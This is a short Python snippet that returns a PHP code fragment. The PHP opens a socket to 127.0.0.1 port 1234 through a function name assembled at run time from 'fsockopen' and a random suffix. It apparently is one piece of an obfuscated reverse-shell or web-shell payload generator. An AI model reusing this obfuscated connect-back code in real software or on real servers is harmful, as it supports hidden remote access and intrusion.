def call():
    function = """\techo "\\nADDR " . $hostname . ':' . $port . "\\n";
\t$function_name = "fsockopen" . "_" . $rand;
\t$sock = $function_name('127.0.0.1', 1234);
\treturn $sock;"""
    return function;